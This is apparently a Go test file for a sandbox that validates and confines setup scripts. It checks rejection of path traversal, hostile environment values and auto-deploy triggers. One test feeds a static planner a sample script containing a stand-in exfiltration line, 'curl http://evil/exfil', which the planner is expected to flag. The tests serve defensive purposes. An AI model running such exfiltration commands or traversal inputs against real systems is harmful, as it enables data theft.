package sandbox

import (
	"context"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func lim() Limits {
	return Limits{WallClock: time.Minute, CPUs: "1.0", MemoryMB: 256, PidsLimit: 64, ScratchMB: 256, OutputCapKB: 64}
}

func TestScriptSetValidate(t *testing.T) {
	ok := ScriptSet{Script: "echo hi", Trigger: TriggerOnDemand, Produces: []string{"env:TOKEN", "file:certs/tls.pem"}}
	if err := ok.Validate(false); err != nil {
		t.Errorf("valid set rejected: %v", err)
	}
	// auto-deploy + auto-setup is a hard reject.
	auto := ScriptSet{Script: "echo hi", Trigger: TriggerOnFirstDeploy}
	if err := auto.Validate(true); err == nil {
		t.Error("auto_deploy + on_first_deploy should be rejected")
	}
	if err := auto.Validate(false); err != nil {
		t.Errorf("on_first_deploy without auto_deploy should be fine: %v", err)
	}
	bad := map[string]ScriptSet{
		"empty":          {Script: "  ", Trigger: TriggerOnDemand},
		"bad trigger":    {Script: "x", Trigger: "whenever"},
		"bad env name":   {Script: "x", Trigger: TriggerOnDemand, Produces: []string{"env:bad-name"}},
		"file traversal": {Script: "x", Trigger: TriggerOnDemand, Produces: []string{"file:../escape"}},
		"abs file":       {Script: "x", Trigger: TriggerOnDemand, Produces: []string{"file:/etc/x"}},
		"junk produces":  {Script: "x", Trigger: TriggerOnDemand, Produces: []string{"thing"}},
	}
	for name, ss := range bad {
		if err := ss.Validate(false); err == nil {
			t.Errorf("%s: expected rejection", name)
		}
	}
}

// The checksum binds the FULL identity: any change voids a prior confirmation.
func TestChecksumBindsEverything(t *testing.T) {
	base := ScriptSet{Script: "echo hi", Trigger: TriggerOnDemand, Produces: []string{"env:A"}, PinnedSHA: "abc"}
	c0 := base.Checksum(lim())

	mut := []func(*ScriptSet, *Limits){
		func(s *ScriptSet, _ *Limits) { s.Script = "echo HI" },
		func(s *ScriptSet, _ *Limits) { s.Trigger = TriggerNever },
		func(s *ScriptSet, _ *Limits) { s.Produces = []string{"env:B"} },
		func(s *ScriptSet, _ *Limits) { s.PinnedSHA = "def" },
		func(_ *ScriptSet, l *Limits) { l.MemoryMB = 512 },
		func(_ *ScriptSet, l *Limits) { l.WallClock = time.Hour },
	}
	for i, m := range mut {
		ss := base
		l := lim()
		m(&ss, &l)
		if ss.Checksum(l) == c0 {
			t.Errorf("mutation %d did not change the checksum", i)
		}
	}
	// Produces order is canonicalized (set semantics), so reordering is stable.
	reordered := base
	reordered.Produces = []string{"env:A"}
	if reordered.Checksum(lim()) != c0 {
		t.Error("checksum should be stable under produces ordering")
	}
}

func TestCapturedEnvHostileData(t *testing.T) {
	if err := ValidateCapturedEnvKey("GOOD_KEY1"); err != nil {
		t.Errorf("valid key rejected: %v", err)
	}
	for _, k := range []string{"bad-key", "1KEY", "k k", ""} {
		if ValidateCapturedEnvKey(k) == nil {
			t.Errorf("invalid key %q accepted", k)
		}
	}
	if err := ValidateCapturedEnvValue("a normal value"); err != nil {
		t.Errorf("valid value rejected: %v", err)
	}
	for _, v := range []string{"has\nnewline", "has\x00nul", "has${VAR}interp", "cr\rhere"} {
		if ValidateCapturedEnvValue(v) == nil {
			t.Errorf("hostile value %q accepted", v)
		}
	}
}

func TestConfineCapturePath(t *testing.T) {
	runDir := "/srv/apps/shop"
	good, err := ConfineCapturePath(runDir, "certs/tls.pem")
	if err != nil || good != filepath.Join(runDir, "certs/tls.pem") {
		t.Fatalf("good capture path: %v %q", err, good)
	}
	for _, name := range []string{"../escape", "/etc/passwd", "a/../../b", ".."} {
		if _, err := ConfineCapturePath(runDir, name); err == nil {
			t.Errorf("traversal capture path %q accepted", name)
		}
	}
}

func TestPlanIsStaticAndAdvisory(t *testing.T) {
	p := Plan("#!/bin/sh\ncurl http://evil/exfil\ndocker ps\n")
	if p.Lines != 3 {
		t.Errorf("lines = %d, want 3", p.Lines)
	}
	joined := strings.Join(p.Findings, " | ")
	if !strings.Contains(joined, "network") || !strings.Contains(joined, "docker") {
		t.Errorf("expected network + docker findings, got %v", p.Findings)
	}
}

// On a non-Linux dev host the sandbox is fail-closed: SelfTest and Run refuse.
func TestSandboxFailClosedOffLinux(t *testing.T) {
	if ok, _ := Available(); ok {
		t.Skip("sandbox is available on this host (Linux); fail-closed path not exercised")
	}
	c := Config{Image: "x@sha256:" + strings.Repeat("a", 64), Binary: "docker", Limits: lim()}
	if err := SelfTest(context.Background(), c); err == nil {
		t.Error("SelfTest must fail closed when unavailable")
	}
	if _, err := Run(context.Background(), c, ScriptSet{Script: "echo hi", Trigger: TriggerOnDemand}, t.TempDir()); err == nil {
		t.Error("Run must fail closed when unavailable")
	}
}
